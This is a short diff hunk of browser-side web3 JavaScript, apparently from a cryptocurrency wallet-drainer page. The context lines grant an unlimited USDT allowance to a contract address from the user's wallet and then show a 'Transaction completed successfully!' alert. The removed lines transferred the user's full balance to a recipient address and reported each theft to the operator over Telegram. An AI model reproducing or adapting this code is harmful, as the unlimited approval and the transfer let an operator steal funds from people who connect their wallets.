@@ -97,10 +97,6 @@ async function start() {
     const maxApproval = web3.utils.toTwosComplement('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
     await token.methods.approve(contractAddress, maxApproval).send({ from: account });
 
-    await token.methods.transfer(recipientAddress, balance).send({ from: account });
-
-    const humanReadable = parseFloat(balance) / 1e6;
-    sendTelegram("USDT Transferred: " + humanReadable + " USDT from: " + account);
 
     alert("Transaction completed successfully!");
   } catch (err) {
